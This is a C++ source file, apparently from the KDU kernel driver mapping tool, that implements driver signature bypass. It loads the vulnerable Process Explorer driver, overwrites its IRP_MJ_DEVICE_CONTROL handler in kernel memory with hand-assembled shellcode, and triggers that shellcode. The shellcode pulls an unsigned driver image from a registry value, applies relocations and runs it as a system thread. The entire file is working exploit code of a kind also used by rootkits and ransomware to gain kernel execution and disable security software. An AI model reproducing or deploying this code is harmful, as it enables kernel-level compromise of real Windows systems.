/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       DRVMAP.CPP
*
*  VERSION:     1.00
*
*  DATE:        24 Jan 2020
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "irp.h"

//
// WARNING: shellcode DOESN'T WORK in DEBUG
//

#define BOOTSTRAPCODE_SIZE 1968 //correct this value if Import change it size

//
// Size in bytes
// InitCode         16
// Import           64
// BootstrapCode    1968
//

//sizeof 2048
typedef struct _SHELLCODE {
    BYTE InitCode[16];
    BYTE BootstrapCode[BOOTSTRAPCODE_SIZE];
    FUNC_TABLE Import;
} SHELLCODE, * PSHELLCODE;

SHELLCODE* g_ShellCode;

/*
* ExAllocatePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
PVOID NTAPI ExAllocatePoolTest(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    return P;
}

/*
* ExFreePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
VOID NTAPI ExFreePoolTest(
    _In_ PVOID P)
{
    VirtualFree(P, 0, MEM_RELEASE);
}

/*
* IofCompleteRequestTest
*
* Purpose:
*
* User mode test routine.
*/
VOID IofCompleteRequestTest(
    _In_ VOID* Irp,
    _In_ CCHAR PriorityBoost)
{
    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(PriorityBoost);
    return;
}

/*
* PsCreateSystemThreadTest
*
* Purpose:
*
* User mode test routine.
*
*/
NTSTATUS NTAPI PsCreateSystemThreadTest(
    _Out_ PHANDLE ThreadHandle,
    _In_ ULONG DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_  HANDLE ProcessHandle,
    _Out_opt_ PCLIENT_ID ClientId,
    _In_ PKSTART_ROUTINE StartRoutine,
    _In_opt_ PVOID StartContext)
{
    UNREFERENCED_PARAMETER(ThreadHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(ProcessHandle);
    UNREFERENCED_PARAMETER(ClientId);
    UNREFERENCED_PARAMETER(StartRoutine);
    UNREFERENCED_PARAMETER(StartContext);
    return STATUS_SUCCESS;
}

IO_STACK_LOCATION g_testIostl;

/*
* IoGetCurrentIrpStackLocationTest
*
* Purpose:
*
* User mode test routine.
*
*/
FORCEINLINE
PIO_STACK_LOCATION
IoGetCurrentIrpStackLocationTest(
    _In_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(Irp);
    g_testIostl.MajorFunction = IRP_MJ_CREATE;
    return &g_testIostl;
}

/*
* SizeOfProc
*
* Purpose:
*
* Very simplified. Return size of procedure when first ret meet.
*
*/
ULONG SizeOfProc(
    _In_ PBYTE FunctionPtr)
{
    ULONG   c = 0;
    UCHAR* p;
    hde64s  hs;

    __try {

        do {
            p = FunctionPtr + c;
            hde64_disasm(p, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (*p != 0xC3);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return c;
}

/*
* FakeDispatchRoutine
*
* Purpose:
*
* Bootstrap shellcode.
* Read image from registry, process relocs and run it.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI FakeDispatchRoutine(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           returnLength = 0, isz, dummy;
    HANDLE                          hKey = NULL, hThread;
    UNICODE_STRING                  str;
    OBJECT_ATTRIBUTES               obja;
    KEY_VALUE_PARTIAL_INFORMATION   keyinfo;
    KEY_VALUE_PARTIAL_INFORMATION* pkeyinfo;
    ULONG_PTR                       Image, exbuffer, pos;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chains;
    DWORD                           c, p, rsz;

    WCHAR                           szRegistryKey[] = {
        L'\\', L'R', L'E', L'G', L'I', L'S', L'T', L'R', L'Y', L'\\',\
        L'M', L'A', L'C', L'H', L'I', L'N', L'E', 0
    };

    USHORT                          cbRegistryKey = sizeof(szRegistryKey) - sizeof(WCHAR);

    WCHAR                           szValueKey[] = { L'~', 0 };

    USHORT                          cbValueKey = sizeof(szValueKey) - sizeof(WCHAR);

    UNREFERENCED_PARAMETER(DeviceObject);

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {

        str.Buffer = szRegistryKey;
        str.Length = cbRegistryKey;
        str.MaximumLength = str.Length + sizeof(UNICODE_NULL);

#ifdef _DEBUG
        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE, 0, 0);
#else
        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
#endif

        status = ShellCode->Import.ZwOpenKey(&hKey, KEY_READ, &obja);
        if (NT_SUCCESS(status)) {

            str.Buffer = szValueKey;
            str.Length = cbValueKey;
            str.MaximumLength = str.Length + sizeof(UNICODE_NULL);

            status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                &keyinfo, sizeof(KEY_VALUE_PARTIAL_INFORMATION), &returnLength);

            if ((status == STATUS_BUFFER_OVERFLOW) ||
                (status == STATUS_BUFFER_TOO_SMALL))
            {
                pkeyinfo = (KEY_VALUE_PARTIAL_INFORMATION*)ShellCode->Import.ExAllocatePool(NonPagedPool, returnLength);
                if (pkeyinfo) {

                    status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                        (PVOID)pkeyinfo, returnLength, &dummy);
                    if (NT_SUCCESS(status)) {

                        Image = (ULONG_PTR)&pkeyinfo->Data[0];
                        dosh = (PIMAGE_DOS_HEADER)Image;
                        fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                        popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                        isz = popth->SizeOfImage;

                        exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePool(
                            NonPagedPool, isz + PAGE_SIZE) + PAGE_SIZE;
                        if (exbuffer != 0) {

                            exbuffer &= ~(PAGE_SIZE - 1);

                            if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
                                if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
                                {
                                    rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                                        popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

                                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                                    delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                                    c = 0;

                                    while (c < rsz) {
                                        p = sizeof(IMAGE_BASE_RELOCATION);
                                        chains = (LPWORD)((PBYTE)rel + p);

                                        while (p < rel->SizeOfBlock) {

                                            switch (*chains >> 12) {
                                            case IMAGE_REL_BASED_HIGHLOW:
                                                *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                                                break;
                                            case IMAGE_REL_BASED_DIR64:
                                                *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                                                break;
                                            }

                                            chains++;
                                            p += sizeof(WORD);
                                        }

                                        c += rel->SizeOfBlock;
                                        rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                                    }
                                }

                            isz >>= 3;
                            for (pos = 0; pos < isz; pos++)
                                ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];

                            hThread = NULL;
                            InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                            if (NT_SUCCESS(ShellCode->Import.PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                                (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL)))
                            {
                                ShellCode->Import.ZwClose(hThread);
                            }

                            DeviceObject->SectorSize = 512;
                        }
                    }
                    ShellCode->Import.ExFreePool(pkeyinfo);
                }
            }
            ShellCode->Import.ZwClose(hKey);
        }
    }
    ShellCode->Import.IofCompleteRequest(Irp, 0);
    return STATUS_SUCCESS;
}

/*
* KDUStorePayload
*
* Purpose:
*
* Load input file as image, resolve import and store result in registry.
*
*/
BOOL KDUStorePayload(
    _In_ LPWSTR lpFileName,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase)
{
    BOOL bSuccess = FALSE;
    HKEY hKey = NULL;
    PVOID DataBuffer = NULL;
    LRESULT lResult;

    NTSTATUS ntStatus;
    ULONG isz;
    PVOID Image = NULL;
    PIMAGE_NT_HEADERS FileHeader;
    UNICODE_STRING ustr;

    ULONG DllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    //
    // Map input file as image.
    //
    RtlInitUnicodeString(&ustr, lpFileName);
    ntStatus = LdrLoadDll(NULL, &DllCharacteristics, &ustr, &Image);
    if ((!NT_SUCCESS(ntStatus)) || (Image == NULL)) {
        printf_s("[!] Error while loading input driver file, NTSTATUS (0x%lX)\r\n", ntStatus);
        return FALSE;
    }
    else {
        printf_s("[+] Input driver file loaded at 0x%p\r\n", Image);
    }

    FileHeader = RtlImageNtHeader(Image);
    if (FileHeader == NULL) {
        printf_s("[!] Error, invalid NT header\r\n");
    }
    else {

        //
        // Resolve import (ntoskrnl only) and write buffer to registry.
        //
        isz = FileHeader->OptionalHeader.SizeOfImage;

        DataBuffer = supHeapAlloc(isz);
        if (DataBuffer) {
            RtlCopyMemory(DataBuffer, Image, isz);

            printf_s("[+] Resolving kernel import for input driver\r\n");
            supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);

            lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &hKey);
            if ((lResult == ERROR_SUCCESS) && (hKey != NULL)) {

                lResult = RegSetKeyValue(hKey, NULL, TEXT("~"), REG_BINARY,
                    DataBuffer, isz);

                bSuccess = (lResult == ERROR_SUCCESS);

                RegCloseKey(hKey);
            }
            supHeapFree(DataBuffer);
        }
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bSuccess;
}

ULONG_PTR KDUResolveFunctionInternal(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR Function)
{
    ULONG_PTR Address = supGetProcAddress(KernelBase, KernelImage, Function);
    if (Address == 0) {
        printf_s("[!] Error, %s address not found\r\n", Function);
        return 0;
    }

    printf_s("[+] %s 0x%llX\r\n", Function, Address);
    return Address;
}

#define ASSERT_RESOLVED_FUNC(FunctionPtr) { if (FunctionPtr == 0) break; }

/*
* KDUSetupShellCode
*
* Purpose:
*
* Construct shellcode data, init code.
*
*/
BOOL KDUSetupShellCode(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR lpMapDriverFileName)
{
    BOOL bResult = FALSE;
    NTSTATUS ntStatus;
    ULONG ProcedureSize = 0;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    WCHAR szNtOs[MAX_PATH * 2];

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    do {

        KernelBase = Context->NtOsBase;
        if (KernelBase == 0) {
            printf_s("[!] Cannot query ntoskrnl loaded base, abort\r\n");
            break;
        }

        printf_s("[+] Loaded ntoskrnl base 0x%llX\r\n", KernelBase);

        //
        // Preload ntoskrnl.exe
        //
        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {
            printf_s("[!] Error while loading ntoskrnl.exe, NTSTATUS (0x%lX)\r\n", ntStatus);
            break;
        }

        printf_s("[+] Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);

        //
        // Store input file in registry.
        //
        if (!KDUStorePayload(lpMapDriverFileName, KernelImage, KernelBase)) {
            printf_s("[!] Cannot write payload to the registry, abort\r\n");
            break;
        }

        //
        // Allocate shellcode.
        //
        g_ShellCode = (SHELLCODE*)VirtualAlloc(NULL, sizeof(SHELLCODE),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        if (g_ShellCode == NULL)
            break;

        //
        // Build initial code part.
        //
        // 00 call +5
        // 05 pop r8
        // 07 sub r8, 5
        // 0B jmps 10 
        // 0D int 3
        // 0E int 3
        // 0F int 3
        // 10 code


        //int 3
        memset(g_ShellCode->InitCode, 0xCC, sizeof(g_ShellCode->InitCode));

        //call +5
        g_ShellCode->InitCode[0x0] = 0xE8;
        g_ShellCode->InitCode[0x1] = 0x00;
        g_ShellCode->InitCode[0x2] = 0x00;
        g_ShellCode->InitCode[0x3] = 0x00;
        g_ShellCode->InitCode[0x4] = 0x00;

        //pop r8
        g_ShellCode->InitCode[0x5] = 0x41;
        g_ShellCode->InitCode[0x6] = 0x58;

        //sub r8, 5
        g_ShellCode->InitCode[0x7] = 0x49;
        g_ShellCode->InitCode[0x8] = 0x83;
        g_ShellCode->InitCode[0x9] = 0xE8;
        g_ShellCode->InitCode[0xA] = 0x05;

        // jmps 
        g_ShellCode->InitCode[0xB] = 0xEB;
        g_ShellCode->InitCode[0xC] = 0x03;

        //
        // Remember function pointers.
        //

        g_ShellCode->Import.ExAllocatePool =
            (pfnExAllocatePool)KDUResolveFunctionInternal(KernelBase, KernelImage, "ExAllocatePool");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ExAllocatePool);

        g_ShellCode->Import.ExFreePool =
            (pfnExFreePool)KDUResolveFunctionInternal(KernelBase, KernelImage, "ExFreePool");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ExFreePool);

        g_ShellCode->Import.PsCreateSystemThread =
            (pfnPsCreateSystemThread)KDUResolveFunctionInternal(KernelBase, KernelImage, "PsCreateSystemThread");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.PsCreateSystemThread);

        g_ShellCode->Import.IofCompleteRequest =
            (pfnIofCompleteRequest)KDUResolveFunctionInternal(KernelBase, KernelImage, "IofCompleteRequest");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.IofCompleteRequest);

        g_ShellCode->Import.ZwClose =
            (pfnZwClose)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwClose");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwClose);

        g_ShellCode->Import.ZwOpenKey =
            (pfnZwOpenKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwOpenKey");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwOpenKey);

        g_ShellCode->Import.ZwQueryValueKey =
            (pfnZwQueryValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwQueryValueKey");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwQueryValueKey);

        g_ShellCode->Import.DbgPrint =
            (pfnDbgPrint)KDUResolveFunctionInternal(KernelBase, KernelImage, "DbgPrint");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.DbgPrint);


        ProcedureSize = SizeOfProc((PBYTE)FakeDispatchRoutine);

        //
        // Shellcode test, unused in Release build.
        //
#ifdef _DEBUG
        g_ShellCode->Import.ZwClose = &NtClose;
        g_ShellCode->Import.ZwOpenKey = &NtOpenKey;
        g_ShellCode->Import.ZwQueryValueKey = &NtQueryValueKey;
        g_ShellCode->Import.ExAllocatePool = &ExAllocatePoolTest;
        g_ShellCode->Import.ExFreePool = &ExFreePoolTest;
        g_ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
        g_ShellCode->Import.PsCreateSystemThread = &PsCreateSystemThreadTest;

        DEVICE_OBJECT temp;

        temp.SectorSize = 0;

        FakeDispatchRoutine(&temp, NULL, g_ShellCode);
#else
        if (ProcedureSize != 0) {

            printf_s("[+] Bootstrap code size = 0x%lX\r\n", ProcedureSize);

            if (ProcedureSize > sizeof(g_ShellCode->BootstrapCode)) {
                printf_s("[!] Bootstrap code size exceeds limit, abort\r\n");
                break;
            }
            memcpy(g_ShellCode->BootstrapCode, FakeDispatchRoutine, ProcedureSize);
            //supWriteBufferToFile(L"out.bin", g_ShellCode->BootstrapCode, ProcedureSize);
        }

        //((void(*)())g_ShellCode->InitCode)();

        bResult = TRUE;
#endif

    } while (FALSE);

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}

/*
* KDUCheckMemoryLayout
*
* Purpose:
*
* Check if shellcode can be placed within the same/next physical page(s).
*
*/
BOOL KDUCheckMemoryLayout(
    _In_ KDU_CONTEXT* Context,
    _In_ ULONG_PTR TargetAddress
)
{
    ULONG_PTR memPage, physAddrStart, physAddrEnd;

    KDU_PROVIDER* prov = Context->Provider;

    //
    // If provider does not support translation return TRUE.
    //
    if ((PVOID)prov->Callbacks.VirtualToPhysical == (PVOID)KDUProviderStub)
        return TRUE;

    memPage = (TargetAddress & 0xfffffffffffff000ull);

    if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        memPage,
        &physAddrStart))
    {
        memPage = (TargetAddress + sizeof(SHELLCODE)) & 0xfffffffffffff000ull;

        if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
            memPage,
            &physAddrEnd))
        {
            ULONG_PTR diffAddr = physAddrEnd - physAddrStart;

            if (diffAddr > PAGE_SIZE)
                return FALSE;
            else
                return TRUE;
        }

    }
    return FALSE;
}

/*
* KDUMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL KDUMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ LPWSTR lpMapDriverFileName)
{
    BOOL bSuccess = FALSE;
    ULONG_PTR objectAddress, targetAddress = 0;
    FILE_OBJECT fileObject;
    DEVICE_OBJECT deviceObject;
    DRIVER_OBJECT driverObject;

    KDU_PROVIDER* prov = Context->Provider;

    ULONG retryCount = 1, maxRetry = 3;

    HANDLE victimDeviceHandle = NULL;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

Reload:

    printf_s("[+] Victim driver map attempt %lu of %lu\r\n", retryCount, maxRetry);

    //
    // If this is reload, release victim.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
        VictimRelease((LPWSTR)PROCEXP152);
    }

    if (VictimCreate(Context->ModuleBase,
        (LPWSTR)PROCEXP152,
        IDR_PROCEXP,
        &victimDeviceHandle))
    {
        printf_s("[+] Victim driver loaded, handle %p\r\n", victimDeviceHandle);
    }
    else {
        printf_s("[!] Could not load victim driver, GetLastError %lu\r\n", GetLastError());
    }

    if (supQueryObjectFromHandle(victimDeviceHandle, &objectAddress)) {

        do {

            RtlSecureZeroMemory(&fileObject, sizeof(fileObject));

            printf_s("[+] Reading FILE_OBJECT at 0x%llX\r\n", objectAddress);

            if (!KDUReadKernelVM(Context,
                objectAddress,
                &fileObject,
                sizeof(FILE_OBJECT)))
            {
                printf_s("[!] Could not read FILE_OBJECT at 0x%llX\r\n", objectAddress);
                break;
            }

            printf_s("[+] Reading DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);

            RtlSecureZeroMemory(&deviceObject, sizeof(deviceObject));

            if (!KDUReadKernelVM(Context,
                (ULONG_PTR)fileObject.DeviceObject,
                &deviceObject,
                sizeof(DEVICE_OBJECT)))
            {
                printf_s("[!] Could not read DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
                break;
            }

            printf_s("[+] Reading DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);

            RtlSecureZeroMemory(&driverObject, sizeof(driverObject));

            if (!KDUReadKernelVM(Context,
                (ULONG_PTR)deviceObject.DriverObject,
                &driverObject,
                sizeof(DRIVER_OBJECT)))
            {
                printf_s("[!] Could not read DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
                break;
            }

            //
            // ProcExp handle no longer needed, can be closed.
            //
            NtClose(victimDeviceHandle);
            victimDeviceHandle = NULL;

            targetAddress = (ULONG_PTR)driverObject.MajorFunction[IRP_MJ_DEVICE_CONTROL];

            if (!KDUCheckMemoryLayout(Context, targetAddress)) {

                printf_s("[!] Physical address is not within same/next page, reload victim driver\r\n");
                retryCount += 1;
                if (retryCount > maxRetry) {
                    printf_s("[!] Too many reloads, abort\r\n");
                    break;
                }
                goto Reload;

            }

            printf_s("[+] Victim IRP_MJ_DEVICE_CONTROL 0x%llX\r\n", targetAddress);
            printf_s("[+] Victim DriverUnload 0x%p\r\n", driverObject.DriverUnload);

            bSuccess = TRUE;

        } while (FALSE);

    }

    //
    // Ensure ProcExp handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    if (bSuccess) {

        if (KDUSetupShellCode(Context, lpMapDriverFileName)) {

            //
            // Write shellcode to driver.
            //
            if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
                targetAddress,
                g_ShellCode, sizeof(SHELLCODE)))
            {
                printf_s("[!] Error writing shellcode to the target driver, abort\r\n");
            }
            else {

                printf_s("[+] Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");

                //
                // Run shellcode.
                // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
                //
                printf_s("[+] Run shellcode\r\n");
                Sleep(1000);
                supOpenDriver((LPWSTR)PROCEXP152, &victimDeviceHandle);
                Sleep(1000);
            }
        }
        else {
            printf_s("[!] Error while building shellcode, abort\r\n");
        }
    }
    else {
        printf_s("[!] Error preloading victim driver, abort\r\n");
    }

    if (victimDeviceHandle)
        NtClose(victimDeviceHandle);

    if (VictimRelease((LPWSTR)PROCEXP152)) {
        printf_s("[+] Victim driver unloaded\r\n");
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return FALSE;
}
